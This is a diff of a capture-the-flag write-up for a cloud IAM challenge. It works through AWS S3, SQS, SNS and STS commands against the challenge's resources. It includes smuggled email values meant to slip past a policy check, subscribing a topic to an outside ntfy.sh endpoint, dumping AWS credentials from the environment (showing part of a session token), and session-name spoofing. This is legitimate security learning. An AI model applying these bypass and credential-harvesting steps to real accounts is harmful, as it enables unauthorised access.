@@ -18,12 +18,12 @@ Pretty straightforward, enumerate the objects and make sure our retrieve is a va
 The `files/` root "directory" is the key part here.
 
 ```bash
-> aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
+$ aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
 2023-06-05 19:13:53         37 flag1.txt
 2023-06-08 19:18:24      81889 logo.pngaws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
 
-> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp
-> cat /tmp/flag1.txt
+$ aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp
+$ cat /tmp/flag1.txt
 {wiz:REDACTED}
 ```
 
@@ -34,7 +34,7 @@ Let's see if anything on there.
 First, we'll have to construct the URL from the ARN, since for whatever reason the AWS CLI hates ARNs.
 
 ```bash
-> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
+$ aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
 {
     "Messages": [
         {
@@ -49,7 +49,7 @@ LiWcnnPGa3xxtGRBRsirVoENOgNMVM6UUCvFcWVEBjVuBZbQYr9RSXm6Zo0=",
         }
     ]
 }
-> curl https://REDACTED
+$ curl https://REDACTED
 {wiz:REDACTED}
 ```
 
@@ -63,7 +63,8 @@ There's no wildcard at the end.
 So it does appear it'll block us from doing stuff like `tbic.wiz.io@my-domain.com`.
 Let's take a look at the SNS docs.
 
-> If the endpoint type is HTTP/S or email, or if the endpoint and the topic are not in the same AWS account, the endpoint owner must run the `ConfirmSubscription` action to confirm the subscription.
+> If the endpoint type is HTTP/S or email, or if the endpoint and the topic are not in the same AWS account,
+> the endpoint owner must run the `ConfirmSubscription` action to confirm the subscription.
 
 The policy won't allow us to confirm the subscription.
 So the flag must be accessible somehow without actually getting any notifications.
@@ -77,11 +78,11 @@ There shouldn't be much difference between these, so we'll use plain text.
 Perhaps we can apply more than one email, and just delimit it by `;`?
 
 ```bash
-> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com;foo@tbic.wiz.io'
+$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com;foo@tbic.wiz.io'
 
 An error occurred (InvalidParameter) when calling the Subscribe operation: Invalid parameter: Email address
 
-> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@tbic.wiz.io'
+$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@tbic.wiz.io'
 {
     "SubscriptionArn": "pending confirmation"
 }
@@ -92,7 +93,7 @@ Returning the subscription ARN wouldn't help, since we're theoretically not auth
 But even then, it would fire off to an email that doesn't exist.
 SQS has dead letter queues, but I think SNS has fixed retry logic and just gives up.
 
-I thought about using https://ntfy.sh or something but I don't have control over the topic suffix.
+I thought about using `https://ntfy.sh` or something but I don't have control over the topic suffix.
 So I wouldn't be able to make it match the wildcard pattern.
 Also I've been told that generally you don't need to go too far to pass these.
 
@@ -139,7 +140,7 @@ We can't sneak in an email using comments either.
 
 An error occurred (InvalidParameter) when calling the Subscribe operation: Invalid parameter: Email address
 
-> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com #@tbic.wiz.io'
+$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com #@tbic.wiz.io'
 
 An error occurred (InvalidParameter) when calling the Subscribe operation: Invalid parameter: Email address
 ```
@@ -148,11 +149,12 @@ Ok stuff it, let's try that SQS queue.
 
 ```bash
  > aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol sqs --notification-endpoint arn
+
 :aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2?foo=bar@tbic.wiz.io
 
 An error occurred (AuthorizationError) when calling the Subscribe operation: User: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell is not authorized to perform: SNS:Subscribe on resource: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications because no resource-based policy allows the SNS:Subscribe action
 
-> aws sts get-caller-identity
+$ aws sts get-caller-identity
 {
     "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",
     "Account": "657483584613",
@@ -164,7 +166,7 @@ We've changed accounts it seems, though I recall the policy being that any AWS p
 Did it bounce us because of the string condition?
 
 ```bash
-> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2?foo=bar@tbic.wiz.io
+$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2?foo=bar@tbic.wiz.io
 
 An error occurred (AuthorizationError) when calling the Subscribe operation: Not authorized to subscribe internal endpoints
 
@@ -176,7 +178,7 @@ That'd make some sense, GitLab blocks private IP endpoints and mirror sources un
 Ok, let's push on this https thing a bit and just use `ntfy.sh`.
 
 ```bash
-> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://ntfy.sh/tbic-wiz-io?foo=bar@tbic.wiz.io
+$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://ntfy.sh/tbic-wiz-io?foo=bar@tbic.wiz.io
 
 {
     "SubscriptionArn": "pending confirmation"
@@ -208,7 +210,6 @@ Cause I don't think we have any control over our `principalArn` and that account
 So we should set some tag of our request/session to match that.
 Perhaps we can assume our role with a session name?
 
-
 ```bash
  > aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name arn:aws:iam::133
 713371337:user/admin
@@ -216,12 +217,12 @@ Perhaps we can assume our role with a session name?
 An error occurred (ValidationError) when calling the AssumeRole operation: 1 validation error detected: Value 'arn:aws:iam::1337133713
 37:user/admin' at 'roleSessionName' failed to satisfy constraint: Member must satisfy regular expression pattern: [\w+=,.@-]*
 
-> aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name user/admin
+$ aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name user/admin
 
 An error occurred (ValidationError) when calling the AssumeRole operation: 1 validation error detected: Value 'user/admin' at 'roleSes
 sionName' failed to satisfy constraint: Member must satisfy regular expression pattern: [\w+=,.@-]*
 
-> aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name "admin"
+$ aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name "admin"
 
 An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/i
 am_shell is not authorized to perform: sts:AssumeRole on resource: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell
@@ -230,7 +231,7 @@ am_shell is not authorized to perform: sts:AssumeRole on resource: arn:aws:sts::
 Hmmm, so without reverting to our IAM user we can't assume the role.
 
 ```bash
-> env | grep -i aws_
+$ env | grep -i aws_
 
 AWS_LAMBDA_FUNCTION_VERSION=$LATEST
 AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDakbmbNYQOhE41g9u4my2WRo6tcfKP7q0aMj4TUIt/PwIhAMFGal67HXsNNqBg
@@ -262,22 +263,22 @@ Curious.
 Let's try and break this back down so we get whatever role the Lambda has.
 
 ```bash
-> unset AWS_SESSION_TOKEN
-> unset AWS_ACCESS_KEY_ID
-> unset AWS_SECRET_ACCESS_KEY
+$ unset AWS_SESSION_TOKEN
+$ unset AWS_ACCESS_KEY_ID
+$ unset AWS_SECRET_ACCESS_KEY
 
-> aws sts get-caller-identity
+$ aws sts get-caller-identity
 {
     "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",
     "Account": "657483584613",
     "Arn": "arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"
 }
 
-> echo $AWS_SECRET_ACCESS_KEY
+$ echo $AWS_SECRET_ACCESS_KEY
 REDACTED
 
-> export AWS_SECRET_ACCESS_KEY=''
-> echo $AWS_SECRET_ACCESS_KEY
+$ export AWS_SECRET_ACCESS_KEY=''
+$ echo $AWS_SECRET_ACCESS_KEY
 REDACTED
 ```
 
@@ -286,7 +287,57 @@ Rats.
 
 Looking over the session tagging capabilities this definitely seems worth exploring.
 
+```bash
+$ aws sts assume-role --role-arn arn:aws:iam::657483584613:role/shell_basic_iam --role-session-name 'arn:aws:iam::133713371337:user/admin'
+
+An error occurred (ValidationError) when calling the AssumeRole operation: 1 validation error detected: Value 'arn:aws:iam::1337133713
+37:user/admin' at 'roleSessionName' failed to satisfy constraint: Member must satisfy regular expression pattern: [\w+=,.@-]*
+```
+
+Ok so looks like we can't use that for session name anyway.
+I did recently run into something about setting tags per-request.
+Maybe if we set a tag to the right key-value pair?
+
+I _very_ much recall an argument to send tags with a request that I saw during my ABAC research.
+But for the life of me I can't find it anymore.
+I'm taking a look at the CLI reference, there's nothing here that would allow me to pass request tags.
+Passing `--tags` and `--request-tags` to the call results in unknown argument errors.
+AWS cli `help` output yields nothing either.
+
+Let's reanalyse this.
+
+- We need `ForAllValues:StringLike` to result in `true`.
+  StringLike means it could wild-card, but there's none.
+  So it's essentially `StringEquals`.
+- `aws:PrincipalArn` needs to be a user from a fictitious account.
+  So either we need to spoof this value, or overwhelm the logical check with some other key.
+- I recall from the AWS IAM Policy Evaluation lecture that if it evaluates in too many contexts it winds up being permissive.
+
+Just had a dumb thought.
+What if the resource-based policy is permissive and accessing it from an authenticated context is the issue?
+Let's try the url real quick in case it's public.
+
+```bash
+$ curl https://thebigiamchallenge-admin-storage-abf1321.s3.us-east-1.amazonaws.com/files
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>Z5H6B2XN57C3AF82</RequestId><HostId>at+yuX/zmNDw4FyQKA+D2YN
+3zCJJPG+LOZ96h4sCe993ejH6Y29ZhRGJCh+j3dAPFeRfVz5al00=</HostId></Error>
+
+$ curl https://thebigiamchallenge-admin-storage-abf1321.s3.us-east-1.amazonaws.com
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>6AWDHFNNB13D5R5Y</RequestId><HostId>Y/YqzjA9DsIQYdc/iSka/VR
+y8RLfKzv+Xssnqh1jkGX4xgAuVcdvS9nBGTO76TxQekZj7o71KQo=</HostId></Error>
+```
+
+Rats.
+Worth a shot though.
+
 ### References
 
 - [Multivalue policy conditions](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html)
 - [Session tags](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_session-tags.html)
+- [S3API list-objects v2](https://docs.aws.amazon.com/cli/latest/reference/s3api/list-objects-v2.html)
+- [S3API list-objects v1](https://docs.aws.amazon.com/cli/latest/reference/s3api/list-objects.html)
+- [S3 ls](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html)
